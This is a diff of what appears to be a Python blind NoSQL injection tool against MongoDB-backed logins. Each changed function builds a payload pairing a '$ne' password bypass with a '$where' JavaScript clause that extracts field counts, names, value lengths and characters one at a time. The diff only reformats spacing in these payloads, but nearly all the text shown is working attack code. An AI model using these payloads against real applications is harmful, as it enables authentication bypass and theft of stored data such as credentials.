@@ -55,7 +55,7 @@ def get_field_count(url, field_count):
         "password": {
             "$ne": ""
         },
-        "$where": f"function(){{ if(Object.keys(this).length=={field_count}) return 1; else return 0; }}"
+        "$where": f"function(){{ if (Object.keys(this).length=={field_count}) return 1; else return 0; }}"
     }
     return make_request(url, payload), payload
 
@@ -65,7 +65,7 @@ def get_field_length(url, field_index, length):
         "password": {
             "$ne": ""
         },
-        "$where": f"function(){{ if(Object.keys(this)[{field_index}].length=={length}) return 1; else return 0; }}"
+        "$where": f"function(){{ if (Object.keys(this)[{field_index}].length=={length}) return 1; else return 0; }}"
     }
     return make_request(url, payload), payload
 
@@ -75,7 +75,7 @@ def get_field_value_length(url, field_name, length):
         "password": {
             "$ne": ""
         },
-        "$where": f"function(){{ if(this.{field_name}.valueOf().toString().length == {length}) return 1; else return 0; }}"
+        "$where": f"function(){{ if (this.{field_name}.valueOf().toString().length=={length}) return 1; else return 0; }}"
     }
     return make_request(url, payload), payload
 
@@ -138,7 +138,7 @@ def get_field_char(url, field_index, position, character):
         "password": {
             "$ne": ""
         },
-        "$where": f"function(){{ if(Object.keys(this)[{field_index}].match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
+        "$where": f"function(){{ if (Object.keys(this)[{field_index}].match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
     }
     return make_request(url, payload), payload
 
@@ -150,7 +150,7 @@ def get_field_value_char(url, field_name, position, character):
         "password": {
             "$ne": ""
         },
-        "$where": f"function(){{ if(this.{field_name}.valueOf().toString().match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
+        "$where": f"function(){{ if (this.{field_name}.valueOf().toString().match('^.{{{position}}}{escaped_character}.*')) return 1; else return 0; }}"
     }
     return make_request(url, payload), payload
 
